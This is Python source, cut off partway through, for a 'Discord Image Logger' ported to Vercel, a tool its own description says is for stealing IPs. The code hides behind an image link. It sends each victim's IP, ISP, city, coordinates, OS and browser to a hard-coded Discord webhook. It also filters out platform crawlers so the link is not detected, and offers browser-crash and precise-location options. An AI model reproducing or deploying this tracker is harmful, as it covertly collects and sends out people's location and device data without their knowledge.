# Discord Image Logger - Vercel (WSGI port)
# Original by DeKrypt | https://github.com/dekrypted

import base64
import os
import traceback
from urllib import parse

import httpagentparser
import requests

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.1-vercel"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": os.environ.get(
        "DISCORD_WEBHOOK",
        "https://discord.com/api/webhooks/1557686272351408198/-dIayA_yXrES-RRzmD9Q300zAlumQZzXoSQ9mldTUooQkZSHkyf-mwqdAV_BCCno4nur",
    ),
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNK3stnuYqsOfj6Hr5DFz8nj4_z1KBHwbr__7arqTyOg&s=10.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,

    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}

blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False


def reportError(error):
    try:
        requests.post(
            config["webhook"],
            json={
                "username": config["username"],
                "content": "@everyone",
                "embeds": [
                    {
                        "title": "Image Logger - Error",
                        "color": config["color"],
                        "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                    }
                ],
            },
            timeout=10,
        )
    except Exception:
        pass


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return

    useragent = useragent or ""

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(
                config["webhook"],
                json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                },
                timeout=10,
            )
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()

    # Rate limited / lookup failed -> skip instead of reporting a fake clean IP
    if info.get("status") == "fail":
        return

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)

    tz = info.get("timezone") or "Unknown/Unknown"
    tz_parts = tz.split("/")
    tz_fmt = (
        f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})" if len(tz_parts) > 1 else tz
    )

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info.get('isp') else 'Unknown'}`
> **ASN:** `{info['as'] if info.get('as') else 'Unknown'}`
> **Country:** `{info['country'] if info.get('country') else 'Unknown'}`
> **Region:** `{info['regionName'] if info.get('regionName') else 'Unknown'}`
> **City:** `{info['city'] if info.get('city') else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{tz_fmt}`
> **Mobile:** `{info.get('mobile')}`
> **VPN:** `{info.get('proxy')}`
> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
